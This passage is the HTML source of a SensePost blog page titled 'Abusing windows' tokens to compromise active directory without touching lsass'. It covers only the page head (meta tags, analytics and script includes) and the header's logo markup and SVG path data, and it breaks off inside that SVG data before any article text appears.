<html class="js svg flexbox flexwrap supports csstransforms3d inlinesvg cssgradients overthrow-enabled" style=""><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta http-equiv="Content-type" content="text/html; charset=UTF-8">
  <title>SensePost |   Abusing windows’ tokens to compromise active directory without touching lsass</title>
  <meta name="description" content="Leaders in Information Security">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="shortcut icon" href="/favicon.ico">
  <!-- Place favicon.ico and apple-touch-icon(s) in the root directory -->

<!--<link href="/css/bootstrap.min.css" rel="stylesheet">
<link href="/css/font-awesome.min.css" rel="stylesheet">-->
  <link rel="stylesheet" href="/styles/main.css">
  <link href="https://fonts.googleapis.com/css2?family=Titillium+Web:wght@400;700&amp;display=swap" rel="stylesheet">

  <!-- <script src="/scripts/vendor/modernizr-custom.js"></script> -->
  <script type="text/javascript" async="" src="https://www.gstatic.com/recaptcha/releases/TqxSU0dsOd2Q9IbI7CpFnJLD/recaptcha__pl.js" crossorigin="anonymous" integrity="sha384-EtuwsrUt4o3rjKbOIgbMlrdETicyC7YJiOMF4S2kRPR2c6EcUDPrB1OFkiSEO3IC"></script><script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/js?id=G-1DSBSQKGCL&amp;cx=c&amp;_slc=1"></script><script src="//www.google-analytics.com/analytics.js"></script><script src="/scripts/vendor/modernizr-custom-build.js"></script>
<script src="/js/jquery.min.js"></script>
<!--<script src="/js/bootstrap.min.js"></script>-->

  <!-- App Icons -->
  <meta name="mobile-web-app-capable" value="yes">
<meta name="msapplication-square70x70logo" content="/img/favicons/windows-tile-70x70.png">
<meta name="msapplication-square150x150logo" content="/img/favicons/windows-tile-150x150.png">
<meta name="msapplication-square310x310logo" content="/img/favicons/windows-tile-310x310.png">
<meta name="msapplication-TileImage" content="/img/favicons/windows-tile-144x144.png">
<meta name="msapplication-TileColor" content="#fff">
<link rel="apple-touch-icon-precomposed" sizes="152x152" href="/img/favicons/apple-touch-icon-152x152-precomposed.png">
<link rel="apple-touch-icon-precomposed" sizes="120x120" href="/img/favicons/apple-touch-icon-120x120-precomposed.png">
<link rel="apple-touch-icon-precomposed" sizes="76x76" href="/img/favicons/apple-touch-icon-76x76-precomposed.png">
<link rel="apple-touch-icon-precomposed" sizes="60x60" href="/img/favicons/apple-touch-icon-60x60-precomposed.png">
<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/favicons/apple-touch-icon-144x144-precomposed.png">
<link rel="apple-touch-icon-precomposed" sizes="114x114" href="/img/favicons/apple-touch-icon-114x114-precomposed.png">
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="/img/favicons/apple-touch-icon-72x72-precomposed.png">
<link rel="apple-touch-icon" sizes="57x57" href="/img/favicons/apple-touch-icon.png">
<link rel="icon" sizes="228x228" href="/img/favicons/coast-icon-228x228.png">
<meta name="mobile-web-app-capable" value="yes">
<link rel="icon" sizes="192x192" href="/img/favicons/homescreen-192x192.png">


  <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="/scripts/require.common.js" src="/scripts/require.common.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://cdn.jsdelivr.net/npm/emailjs-com@1/dist/email.min.js" src="https://cdn.jsdelivr.net/npm/emailjs-com@1/dist/email.min.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://www.google.com/recaptcha/api.js" src="https://www.google.com/recaptcha/api.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="/scripts/pages/submenu/submenu.require.js" src="/scripts/pages/submenu/submenu.require.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="/scripts/pages/blog/blog.require.js" src="/scripts/pages/blog/blog.require.js"></script></head>
  <body>

  <div class="site js-site">

    <header id="masthead" class="header js-header" role="banner">

  <div class="container">


    <h1 class="sitetitle" tabindex="1">
      



<div class="logo">
            <a href="/">
                <div class="master-logo">
					<!--<svg id="Layer_1" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 283.46 283.46"><defs><style>.cls-1{fill:#ff7900;}.cls-2{fill:#fff;}</style></defs><title>Master_Logo_RGB</title><rect class="cls-1" width="283.46" height="283.46"/><path class="cls-2" d="M111.2,256a23.23,23.23,0,0,1-13,3.92c-7.36,0-11.71-4.9-11.71-11.46,0-8.83,8.12-13.51,24.85-15.4v-2.19c0-2.87-2.18-4.53-6.2-4.53a11.76,11.76,0,0,0-9.61,4.53l-7-4q5.52-7.71,16.82-7.7c10.28,0,16,4.45,16,11.7,0,0,0,28.52,0,28.6h-9.2Zm-14.55-8.3c0,2.65,1.67,5.13,4.68,5.13,3.27,0,6.44-1.36,9.62-4.16v-9.34C101.25,240.56,96.65,243.05,96.65,247.72Z"/><path class="cls-2" d="M129.54,221.07l8.59-1.19.94,4.68c4.85-3.55,8.7-5.44,13.55-5.44,8.12,0,12.3,4.31,12.3,12.84v27.47H154.55V233.77c0-4.83-1.26-7-5-7-3.1,0-6.19,1.43-9.71,4.38v28.3H129.54Z"/><path class="cls-2" d="M233.69,260.18c-11.63,0-18.57-7.47-18.57-20.45s7-20.61,18.4-20.61,18.15,7.25,18.15,20.08c0,.68-.08,1.36-.08,2H225.32c.08,7.47,3.18,11.24,9.29,11.24,3.93,0,6.52-1.58,8.95-5l7.61,4.22C247.82,257.24,241.8,260.18,233.69,260.18Zm7.78-25.66c0-5.28-3-8.38-7.95-8.38-4.68,0-7.61,3-8,8.38Z"/><path class="cls-2" d="M34.89,260.61c-10.27,0-19.52-6.54-19.52-20.82S24.62,219,34.89,219s19.52,6.55,19.52,20.82S45.15,260.61,34.89,260.61Zm0-32.86c-7.75,0-9.19,7-9.19,12s1.44,12.05,9.19,12.05,9.19-7,9.19-12.05S42.64,227.75,34.89,227.75Z"/><path class="cls-2" d="M61.53,220H71.4v4.64a15.29,15.29,0,0,1,10.87-5.45,8.6,8.6,0,0,1,1.34.07V229h-.5c-4.52,0-9.46.7-11,4.21v26.24H61.53Z"/><path class="cls-2" d="M190.34,251c7.88-.06,8.54-8.07,8.54-13.31,0-6.16-3-11.18-8.61-11.18-3.73,0-7.89,2.72-7.89,11.61C182.38,243,182.72,251.05,190.34,251Zm18.52-31.12v37.35c0,6.6-.5,17.45-19.31,17.57-7.75,0-14.94-3.05-16.38-9.83l10.25-1.65c.43,1.94,1.61,3.88,7.42,3.88,5.39,0,8-2.58,8-8.75v-4.59l-.14-.14c-1.65,2.94-4.16,5.74-10.19,5.74-9.19,0-16.44-6.38-16.44-19.72,0-13.19,7.47-20.57,15.86-20.58,7.87,0,10.79,3.57,11.46,5.46l-.12,0,.85-4.72Z"/><path class="cls-2" d="M255.75,206.79h-4.08v11.3h-2.16v-11.3h-4.08v-1.74h10.32Zm17,11.3h-2.15V207.2h-.07l-4.27,10.89h-1.36l-4.27-10.89h-.06v10.89h-2.15v-13h3.32l3.89,9.9,3.83-9.9h3.29Z"/></svg>-->
					<img src="/img/master-logo.svg" alt="Orange Cyberdefense">
				</div>
                <div class="master-logo-small"><img src="/images/orange-logo-small.svg" alt=""></div>
                <div class="logo-text">
				<!--	<svg version="1.1" id="Calque_1" xmlns="http://www.w3.org/2000/svg" x="0" y="0" viewBox="0 0 480.83 190.83" xml:space="preserve" width="481" height="191"><style>.st0{fill:#ff7900}</style><g><path class="st0" d="M59.98 38.11c6.53 0 11.79 2.17 15.78 6.51s5.98 9.96 5.98 16.86c0 6.74-2.01 12.26-6.01 16.55-4.01 4.3-9.26 6.45-15.75 6.45-6.53 0-11.79-2.15-15.78-6.45-3.99-4.3-5.98-9.82-5.98-16.55 0-6.86 2-12.47 6.01-16.83 4.01-4.36 9.26-6.54 15.75-6.54zM47.95 61.49c0 4.46 1.05 8.05 3.16 10.76 2.11 2.71 5.06 4.06 8.87 4.06 3.72 0 6.65-1.33 8.8-4C70.93 69.64 72 66.03 72 61.49c0-4.75-1.06-8.47-3.19-11.16-2.13-2.69-5.09-4.03-8.9-4.03-3.72 0-6.64 1.34-8.77 4.03-2.13 2.68-3.19 6.4-3.19 11.16zM106.17 50.51c.74 0 1.38.1 1.92.31V59c-.95-.21-2.01-.31-3.16-.31-5.79 0-8.68 3.43-8.68 10.29v14.45h-8.8V51.38h8.37v5.95h.12c.87-2.07 2.24-3.72 4.12-4.96 1.88-1.24 3.92-1.86 6.11-1.86zM125.39 50.51c9.34.04 14.01 3.08 14.01 9.11v16.99c0 3.14.37 5.42 1.12 6.82h-8.93c-.33-.99-.54-2.02-.62-3.1-2.6 2.65-6.2 3.97-10.79 3.97-3.35 0-6-.85-7.97-2.54-1.96-1.69-2.95-4.05-2.95-7.07 0-2.93.93-5.21 2.79-6.82 1.9-1.69 5.35-2.77 10.35-3.22 3.55-.37 5.81-.84 6.76-1.39.95-.56 1.43-1.42 1.43-2.57 0-1.45-.43-2.52-1.3-3.22-.87-.7-2.32-1.05-4.34-1.05-1.86 0-3.27.38-4.22 1.15-.95.77-1.51 1.99-1.67 3.69h-8.8c.21-3.51 1.65-6.18 4.34-8 2.68-1.84 6.28-2.75 10.79-2.75zm-7.32 23.81c0 2.73 1.8 4.09 5.39 4.09 4.71-.04 7.09-2.46 7.13-7.25v-3.41c-.7.7-2.48 1.22-5.33 1.55-2.48.29-4.3.8-5.46 1.52-1.15.72-1.73 1.89-1.73 3.5zM164.63 50.51c4.09 0 7.06 1.03 8.9 3.1 1.84 2.07 2.76 5.35 2.76 9.86v19.96h-8.8V65.27c0-2.64-.42-4.61-1.27-5.89-.85-1.28-2.3-1.92-4.37-1.92-2.4 0-4.13.72-5.21 2.17s-1.61 3.82-1.61 7.13v16.68h-8.8V51.38h8.37v4.46h.19c2.17-3.55 5.46-5.33 9.84-5.33zM195.75 50.51c4.42 0 7.6 1.72 9.55 5.15h.12v-4.28h8.37v30.07c0 4.63-1.44 8.14-4.31 10.54-2.87 2.4-6.95 3.6-12.25 3.6-4.05 0-7.39-.97-10.01-2.91-2.63-1.94-4.02-4.4-4.19-7.38h8.74c.7 2.93 2.89 4.4 6.57 4.4 2.27 0 4.02-.67 5.24-2.01 1.22-1.34 1.83-3.25 1.83-5.74v-4.4h-.12c-.87 1.57-2.14 2.79-3.81 3.66-1.67.87-3.61 1.3-5.8 1.3-4.3 0-7.66-1.41-10.08-4.22-2.42-2.81-3.63-6.78-3.63-11.9 0-4.55 1.27-8.33 3.81-11.35 2.57-3.02 5.88-4.53 9.97-4.53zm-4.96 15.75c0 3.02.63 5.37 1.89 7.07 1.26 1.7 3.01 2.54 5.24 2.54 2.27 0 4.09-.82 5.46-2.45 1.36-1.63 2.05-3.79 2.05-6.48 0-3.22-.65-5.66-1.95-7.32-1.3-1.65-3.17-2.48-5.61-2.48-2.27 0-4.02.86-5.24 2.57-1.23 1.73-1.84 3.91-1.84 6.55zM235.68 50.51c3.02 0 5.7.7 8.06 2.11 2.36 1.41 4.21 3.44 5.55 6.11 1.34 2.67 2.02 5.73 2.02 9.21 0 .33-.02.87-.06 1.61h-23.13c.08 2.56.75 4.56 2.02 5.98 1.26 1.43 3.19 2.14 5.8 2.14 1.61 0 3.09-.4 4.43-1.21 1.34-.81 2.2-1.79 2.57-2.95h7.75c-2.27 7.19-7.28 10.79-15 10.79-2.94-.04-5.65-.68-8.15-1.92-2.5-1.24-4.5-3.17-5.98-5.8-1.49-2.62-2.23-5.67-2.23-9.15 0-3.26.75-6.24 2.26-8.93 1.51-2.69 3.51-4.69 6.01-6.01 2.49-1.31 5.19-1.98 8.08-1.98zm6.76 13.46c-.41-2.4-1.18-4.13-2.29-5.21-1.12-1.07-2.71-1.61-4.77-1.61-2.15 0-3.84.61-5.08 1.83-1.24 1.22-1.96 2.88-2.17 4.99h14.31z"/><path d="M59.98 100.11c5.17 0 9.51 1.46 13.02 4.37s5.54 6.77 6.08 11.56h-9.42c-.33-2.19-1.43-4.03-3.29-5.52-1.86-1.49-3.99-2.23-6.39-2.23-3.8 0-6.76 1.36-8.87 4.09-2.11 2.73-3.16 6.43-3.16 11.1 0 4.55 1.06 8.15 3.19 10.82s5.07 4 8.83 4c2.81 0 5.08-.86 6.82-2.57 1.74-1.71 2.81-4.16 3.22-7.35h9.42c-.5 5.62-2.51 10.04-6.04 13.27-3.53 3.22-8.01 4.84-13.42 4.84-6.49 0-11.74-2.14-15.75-6.42-4.01-4.28-6.01-9.81-6.01-16.58 0-6.86 1.98-12.47 5.95-16.83 3.97-4.37 9.24-6.55 15.82-6.55zM90.85 113.38l7.25 21.95h.12l7.01-21.95h9.11l-13.39 36.08c-.95 2.52-2.26 4.36-3.94 5.52-1.67 1.16-4 1.74-6.98 1.74-1.28 0-3.12-.1-5.52-.31v-7.25c1.57.21 3.12.31 4.65.31 1.24 0 2.2-.38 2.88-1.15.68-.76 1.02-1.73 1.02-2.88 0-.66-.12-1.32-.37-1.98l-11.28-30.07h9.44zM126.13 101.17v16.12h.12c.95-1.45 2.3-2.6 4.06-3.47 1.76-.87 3.77-1.3 6.04-1.3 3.93 0 7.12 1.57 9.58 4.71 2.46 3.14 3.69 7.19 3.69 12.15 0 5-1.22 9.07-3.66 12.21-2.44 3.14-5.66 4.71-9.67 4.71-5.21 0-8.7-1.65-10.48-4.96h-.12v4.09h-8.37v-44.27h8.81zm-.31 28.27c0 3.1.68 5.58 2.05 7.44 1.36 1.86 3.18 2.79 5.46 2.79 2.23 0 4.04-.91 5.42-2.73 1.38-1.82 2.08-4.32 2.08-7.5 0-3.14-.67-5.64-2.02-7.5-1.34-1.86-3.19-2.79-5.55-2.79-2.32 0-4.13.95-5.46 2.85-1.32 1.9-1.98 4.38-1.98 7.44zM170.03 112.51c3.02 0 5.7.7 8.06 2.11 2.36 1.41 4.21 3.44 5.55 6.11 1.34 2.67 2.02 5.74 2.02 9.21 0 .33-.02.87-.06 1.61h-23.13c.08 2.56.75 4.56 2.02 5.98 1.26 1.43 3.19 2.14 5.8 2.14 1.61 0 3.09-.4 4.43-1.21 1.34-.81 2.2-1.79 2.57-2.95h7.75c-2.27 7.19-7.28 10.79-15 10.79-2.94-.04-5.65-.68-8.15-1.92-2.5-1.24-4.5-3.17-5.98-5.8-1.49-2.62-2.23-5.67-2.23-9.15 0-3.26.75-6.24 2.26-8.93 1.51-2.69 3.51-4.69 6.01-6.01 2.48-1.32 5.18-1.98 8.08-1.98zm6.75 13.46c-.41-2.4-1.18-4.13-2.29-5.21-1.12-1.07-2.71-1.61-4.77-1.61-2.15 0-3.84.61-5.08 1.83-1.24 1.22-1.96 2.88-2.17 4.99h14.31zM209.52 112.51c.74 0 1.38.1 1.92.31V121c-.95-.21-2.01-.31-3.16-.31-5.79 0-8.68 3.43-8.68 10.29v14.45h-8.8v-32.05h8.37v5.95h.12c.87-2.07 2.24-3.72 4.12-4.96 1.88-1.24 3.92-1.86 6.11-1.86zM245.66 101.17v44.27h-8.37v-4.09h-.12c-1.9 3.31-5.15 4.96-9.73 4.96-4.42 0-7.93-1.61-10.51-4.84-2.58-3.22-3.88-7.34-3.88-12.34 0-4.88 1.31-8.87 3.94-11.97 2.62-3.1 6.04-4.65 10.26-4.65 1.94 0 3.77.4 5.49 1.21 1.71.81 3.05 1.99 4 3.56h.12v-16.12h8.8zm-23.8 28.21c0 2.93.69 5.38 2.08 7.35 1.38 1.96 3.27 2.95 5.67 2.95 2.52 0 4.41-.92 5.67-2.76 1.26-1.84 1.89-4.37 1.89-7.59s-.66-5.72-1.98-7.5c-1.32-1.78-3.2-2.67-5.64-2.67-2.52 0-4.43.93-5.73 2.79-1.31 1.85-1.96 4.33-1.96 7.43zM267.12 112.51c3.02 0 5.7.7 8.06 2.11 2.36 1.41 4.21 3.44 5.55 6.11 1.34 2.67 2.02 5.74 2.02 9.21 0 .33-.02.87-.06 1.61h-23.13c.08 2.56.75 4.56 2.02 5.98 1.26 1.43 3.19 2.14 5.8 2.14 1.61 0 3.09-.4 4.43-1.21 1.34-.81 2.2-1.79 2.57-2.95h7.75c-2.27 7.19-7.28 10.79-15 10.79-2.94-.04-5.65-.68-8.15-1.92-2.5-1.24-4.5-3.17-5.98-5.8-1.49-2.62-2.23-5.67-2.23-9.15 0-3.26.75-6.24 2.26-8.93 1.51-2.69 3.51-4.69 6.01-6.01 2.49-1.32 5.18-1.98 8.08-1.98zm6.75 13.46c-.41-2.4-1.18-4.13-2.29-5.21-1.12-1.07-2.71-1.61-4.77-1.61-2.15 0-3.84.61-5.08 1.83-1.24 1.22-1.96 2.88-2.17 4.99h14.31zM300.53 101.17c.74 0 2.29.08 4.65.25v6.57c-1.16-.12-2.21-.19-3.16-.19-1.28 0-2.17.28-2.67.84-.5.56-.74 1.52-.74 2.88v1.86h6.08v5.89h-6.08v26.16h-8.8v-26.16h-5.27v-5.89h5.27v-2.36c0-3.14.94-5.57 2.82-7.29 1.88-1.7 4.51-2.56 7.9-2.56zM323.35 112.51c3.02 0 5.7.7 8.06 2.11 2.36 1.41 4.2 3.44 5.55 6.11 1.34 2.67 2.01 5.74 2.01 9.21 0 .33-.02.87-.06 1.61h-23.13c.08 2.56.75 4.56 2.02 5.98 1.26 1.43 3.19 2.14 5.8 2.14 1.61 0 3.09-.4 4.43-1.21 1.34-.81 2.2-1.79 2.57-2.95h7.75c-2.27 7.19-7.28 10.79-15 10.79-2.94-.04-5.65-.68-8.15-1.92-2.5-1.24-4.5-3.17-5.98-5.8-1.49-2.62-2.23-5.67-2.23-9.15 0-3.26.75-6.24 2.26-8.93 1.51-2.69 3.51-4.69 6.01-6.01 2.5-1.32 5.2-1.98 8.09-1.98zm6.76 13.46c-.41-2.4-1.18-4.13-2.29-5.21-1.12-1.07-2.71-1.61-4.77-1.61-2.15 0-3.84.61-5.08 1.83-1.24 1.22-1.96 2.88-2.17 4.99h14.31zM362.53 112.51c4.09 0 7.06 1.03 8.9 3.1 1.84 2.07 2.76 5.35 2.76 9.86v19.96h-8.8v-18.17c0-2.64-.42-4.61-1.27-5.89-.85-1.28-2.3-1.92-4.37-1.92-2.4 0-4.13.72-5.21 2.17s-1.61 3.82-1.61 7.13v16.68h-8.8v-32.05h8.37v4.46h.19c2.18-3.55 5.46-5.33 9.84-5.33zM394.03 112.51c4.3 0 7.66.87 10.08 2.6 2.42 1.74 3.77 4.28 4.06 7.63h-8.37c-.12-1.53-.68-2.63-1.67-3.32-.99-.68-2.44-1.02-4.34-1.02-1.65 0-2.88.25-3.69.74-.81.5-1.21 1.24-1.21 2.23 0 .74.27 1.36.81 1.86s1.35.93 2.45 1.3c1.09.37 2.3.68 3.63.93 4.01.79 6.84 1.59 8.49 2.42 1.65.83 2.86 1.82 3.63 2.98.76 1.16 1.15 2.58 1.15 4.28 0 3.6-1.31 6.36-3.94 8.28-2.62 1.92-6.19 2.88-10.69 2.88-4.71 0-8.38-1.01-11-3.04-2.63-2.02-3.98-4.77-4.06-8.25h8.37c0 1.65.64 2.97 1.92 3.94 1.28.97 2.89 1.46 4.84 1.46 1.65 0 3.03-.36 4.12-1.09 1.09-.72 1.64-1.72 1.64-3.01 0-.83-.34-1.51-1.02-2.05-.68-.54-1.64-1.01-2.88-1.43-1.24-.41-3.16-.89-5.77-1.43-2.07-.41-3.91-.97-5.52-1.67-1.61-.7-2.84-1.62-3.69-2.76-.85-1.14-1.27-2.53-1.27-4.18 0-2.11.51-3.95 1.52-5.52 1.01-1.57 2.56-2.76 4.65-3.56 2.06-.79 4.66-1.2 7.76-1.2zM429 112.51c3.02 0 5.7.7 8.06 2.11 2.36 1.41 4.21 3.44 5.55 6.11 1.34 2.67 2.01 5.74 2.01 9.21 0 .33-.02.87-.06 1.61h-23.13c.08 2.56.75 4.56 2.02 5.98 1.26 1.43 3.19 2.14 5.8 2.14 1.61 0 3.09-.4 4.43-1.21 1.34-.81 2.2-1.79 2.57-2.95H444c-2.27 7.19-7.28 10.79-15 10.79-2.94-.04-5.65-.68-8.15-1.92-2.5-1.24-4.5-3.17-5.98-5.8-1.49-2.62-2.23-5.67-2.23-9.15 0-3.26.75-6.24 2.26-8.93 1.51-2.69 3.51-4.69 6.01-6.01 2.49-1.32 5.19-1.98 8.09-1.98zm6.75 13.46c-.41-2.4-1.18-4.13-2.29-5.21-1.12-1.07-2.71-1.61-4.77-1.61-2.15 0-3.84.61-5.08 1.83-1.24 1.22-1.96 2.88-2.17 4.99h14.31z"/></g></svg>-->
					<img src="/img/logo-text-x.svg" alt="Orange Cyberdefense">
				</div>
            </a>
</div>
<!--
<a href="/" rel="home" title="Orange Cyberdefense home" class="sp-logo">
  <span class="visuallyhidden">Orange Cyberdefense</span>
  <span class="sp-logo__icon">
    <span class="sp-logo__wrap sp-logo__wrap--icon">
      <svg id="Layer_1" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 283.46 283.46"><defs><style>.cls-1{fill:#ff7900;}.cls-2{fill:#fff;}</style></defs><title>Master_Logo_RGB</title><rect class="cls-1" width="283.46" height="283.46"/><path class="cls-2" d="M111.2,256a23.23,23.23,0,0,1-13,3.92c-7.36,0-11.71-4.9-11.71-11.46,0-8.83,8.12-13.51,24.85-15.4v-2.19c0-2.87-2.18-4.53-6.2-4.53a11.76,11.76,0,0,0-9.61,4.53l-7-4q5.52-7.71,16.82-7.7c10.28,0,16,4.45,16,11.7,0,0,0,28.52,0,28.6h-9.2Zm-14.55-8.3c0,2.65,1.67,5.13,4.68,5.13,3.27,0,6.44-1.36,9.62-4.16v-9.34C101.25,240.56,96.65,243.05,96.65,247.72Z"/><path class="cls-2" d="M129.54,221.07l8.59-1.19.94,4.68c4.85-3.55,8.7-5.44,13.55-5.44,8.12,0,12.3,4.31,12.3,12.84v27.47H154.55V233.77c0-4.83-1.26-7-5-7-3.1,0-6.19,1.43-9.71,4.38v28.3H129.54Z"/><path class="cls-2" d="M233.69,260.18c-11.63,0-18.57-7.47-18.57-20.45s7-20.61,18.4-20.61,18.15,7.25,18.15,20.08c0,.68-.08,1.36-.08,2H225.32c.08,7.47,3.18,11.24,9.29,11.24,3.93,0,6.52-1.58,8.95-5l7.61,4.22C247.82,257.24,241.8,260.18,233.69,260.18Zm7.78-25.66c0-5.28-3-8.38-7.95-8.38-4.68,0-7.61,3-8,8.38Z"/><path class="cls-2" d="M34.89,260.61c-10.27,0-19.52-6.54-19.52-20.82S24.62,219,34.89,219s19.52,6.55,19.52,20.82S45.15,260.61,34.89,260.61Zm0-32.86c-7.75,0-9.19,7-9.19,12s1.44,12.05,9.19,12.05,9.19-7,9.19-12.05S42.64,227.75,34.89,227.75Z"/><path class="cls-2" d="M61.53,220H71.4v4.64a15.29,15.29,0,0,1,10.87-5.45,8.6,8.6,0,0,1,1.34.07V229h-.5c-4.52,0-9.46.7-11,4.21v26.24H61.53Z"/><path class="cls-2" d="M190.34,251c7.88-.06,8.54-8.07,8.54-13.31,0-6.16-3-11.18-8.61-11.18-3.73,0-7.89,2.72-7.89,11.61C182.38,243,182.72,251.05,190.34,251Zm18.52-31.12v37.35c0,6.6-.5,17.45-19.31,17.57-7.75,0-14.94-3.05-16.38-9.83l10.25-1.65c.43,1.94,1.61,3.88,7.42,3.88,5.39,0,8-2.58,8-8.75v-4.59l-.14-.14c-1.65,2.94-4.16,5.74-10.19,5.74-9.19,0-16.44-6.38-16.44-19.72,0-13.19,7.47-20.57,15.86-20.58,7.87,0,10.79,3.57,11.46,5.46l-.12,0,.85-4.72Z"/><path class="cls-2" d="M255.75,206.79h-4.08v11.3h-2.16v-11.3h-4.08v-1.74h10.32Zm17,11.3h-2.15V207.2h-.07l-4.27,10.89h-1.36l-4.27-10.89h-.06v10.89h-2.15v-13h3.32l3.89,9.9,3.83-9.9h3.29Z"/></svg>
    </span>
  </span>

  <span class="sp-logo__text sp-logo__text--header">
    <span class="sp-logo__wrap sp-logo__wrap--text">
      <svg version="1.1" id="Calque_1" xmlns="http://www.w3.org/2000/svg" x="0" y="0" viewBox="0 0 480.83 190.83" xml:space="preserve" width="481" height="191"><style>.st0{fill:#ff7900}</style><g><path class="st0" d="M59.98 38.11c6.53 0 11.79 2.17 15.78 6.51s5.98 9.96 5.98 16.86c0 6.74-2.01 12.26-6.01 16.55-4.01 4.3-9.26 6.45-15.75 6.45-6.53 0-11.79-2.15-15.78-6.45-3.99-4.3-5.98-9.82-5.98-16.55 0-6.86 2-12.47 6.01-16.83 4.01-4.36 9.26-6.54 15.75-6.54zM47.95 61.49c0 4.46 1.05 8.05 3.16 10.76 2.11 2.71 5.06 4.06 8.87 4.06 3.72 0 6.65-1.33 8.8-4C70.93 69.64 72 66.03 72 61.49c0-4.75-1.06-8.47-3.19-11.16-2.13-2.69-5.09-4.03-8.9-4.03-3.72 0-6.64 1.34-8.77 4.03-2.13 2.68-3.19 6.4-3.19 11.16zM106.17 50.51c.74 0 1.38.1 1.92.31V59c-.95-.21-2.01-.31-3.16-.31-5.79 0-8.68 3.43-8.68 10.29v14.45h-8.8V51.38h8.37v5.95h.12c.87-2.07 2.24-3.72 4.12-4.96 1.88-1.24 3.92-1.86 6.11-1.86zM125.39 50.51c9.34.04 14.01 3.08 14.01 9.11v16.99c0 3.14.37 5.42 1.12 6.82h-8.93c-.33-.99-.54-2.02-.62-3.1-2.6 2.65-6.2 3.97-10.79 3.97-3.35 0-6-.85-7.97-2.54-1.96-1.69-2.95-4.05-2.95-7.07 0-2.93.93-5.21 2.79-6.82 1.9-1.69 5.35-2.77 10.35-3.22 3.55-.37 5.81-.84 6.76-1.39.95-.56 1.43-1.42 1.43-2.57 0-1.45-.43-2.52-1.3-3.22-.87-.7-2.32-1.05-4.34-1.05-1.86 0-3.27.38-4.22 1.15-.95.77-1.51 1.99-1.67 3.69h-8.8c.21-3.51 1.65-6.18 4.34-8 2.68-1.84 6.28-2.75 10.79-2.75zm-7.32 23.81c0 2.73 1.8 4.09 5.39 4.09 4.71-.04 7.09-2.46 7.13-7.25v-3.41c-.7.7-2.48 1.22-5.33 1.55-2.48.29-4.3.8-5.46 1.52-1.15.72-1.73 1.89-1.73 3.5zM164.63 50.51c4.09 0 7.06 1.03 8.9 3.1 1.84 2.07 2.76 5.35 2.76 9.86v19.96h-8.8V65.27c0-2.64-.42-4.61-1.27-5.89-.85-1.28-2.3-1.92-4.37-1.92-2.4 0-4.13.72-5.21 2.17s-1.61 3.82-1.61 7.13v16.68h-8.8V51.38h8.37v4.46h.19c2.17-3.55 5.46-5.33 9.84-5.33zM195.75 50.51c4.42 0 7.6 1.72 9.55 5.15h.12v-4.28h8.37v30.07c0 4.63-1.44 8.14-4.31 10.54-2.87 2.4-6.95 3.6-12.25 3.6-4.05 0-7.39-.97-10.01-2.91-2.63-1.94-4.02-4.4-4.19-7.38h8.74c.7 2.93 2.89 4.4 6.57 4.4 2.27 0 4.02-.67 5.24-2.01 1.22-1.34 1.83-3.25 1.83-5.74v-4.4h-.12c-.87 1.57-2.14 2.79-3.81 3.66-1.67.87-3.61 1.3-5.8 1.3-4.3 0-7.66-1.41-10.08-4.22-2.42-2.81-3.63-6.78-3.63-11.9 0-4.55 1.27-8.33 3.81-11.35 2.57-3.02 5.88-4.53 9.97-4.53zm-4.96 15.75c0 3.02.63 5.37 1.89 7.07 1.26 1.7 3.01 2.54 5.24 2.54 2.27 0 4.09-.82 5.46-2.45 1.36-1.63 2.05-3.79 2.05-6.48 0-3.22-.65-5.66-1.95-7.32-1.3-1.65-3.17-2.48-5.61-2.48-2.27 0-4.02.86-5.24 2.57-1.23 1.73-1.84 3.91-1.84 6.55zM235.68 50.51c3.02 0 5.7.7 8.06 2.11 2.36 1.41 4.21 3.44 5.55 6.11 1.34 2.67 2.02 5.73 2.02 9.21 0 .33-.02.87-.06 1.61h-23.13c.08 2.56.75 4.56 2.02 5.98 1.26 1.43 3.19 2.14 5.8 2.14 1.61 0 3.09-.4 4.43-1.21 1.34-.81 2.2-1.79 2.57-2.95h7.75c-2.27 7.19-7.28 10.79-15 10.79-2.94-.04-5.65-.68-8.15-1.92-2.5-1.24-4.5-3.17-5.98-5.8-1.49-2.62-2.23-5.67-2.23-9.15 0-3.26.75-6.24 2.26-8.93 1.51-2.69 3.51-4.69 6.01-6.01 2.49-1.31 5.19-1.98 8.08-1.98zm6.76 13.46c-.41-2.4-1.18-4.13-2.29-5.21-1.12-1.07-2.71-1.61-4.77-1.61-2.15 0-3.84.61-5.08 1.83-1.24 1.22-1.96 2.88-2.17 4.99h14.31z"/><path d="M59.98 100.11c5.17 0 9.51 1.46 13.02 4.37s5.54 6.77 6.08 11.56h-9.42c-.33-2.19-1.43-4.03-3.29-5.52-1.86-1.49-3.99-2.23-6.39-2.23-3.8 0-6.76 1.36-8.87 4.09-2.11 2.73-3.16 6.43-3.16 11.1 0 4.55 1.06 8.15 3.19 10.82s5.07 4 8.83 4c2.81 0 5.08-.86 6.82-2.57 1.74-1.71 2.81-4.16 3.22-7.35h9.42c-.5 5.62-2.51 10.04-6.04 13.27-3.53 3.22-8.01 4.84-13.42 4.84-6.49 0-11.74-2.14-15.75-6.42-4.01-4.28-6.01-9.81-6.01-16.58 0-6.86 1.98-12.47 5.95-16.83 3.97-4.37 9.24-6.55 15.82-6.55zM90.85 113.38l7.25 21.95h.12l7.01-21.95h9.11l-13.39 36.08c-.95 2.52-2.26 4.36-3.94 5.52-1.67 1.16-4 1.74-6.98 1.74-1.28 0-3.12-.1-5.52-.31v-7.25c1.57.21 3.12.31 4.65.31 1.24 0 2.2-.38 2.88-1.15.68-.76 1.02-1.73 1.02-2.88 0-.66-.12-1.32-.37-1.98l-11.28-30.07h9.44zM126.13 101.17v16.12h.12c.95-1.45 2.3-2.6 4.06-3.47 1.76-.87 3.77-1.3 6.04-1.3 3.93 0 7.12 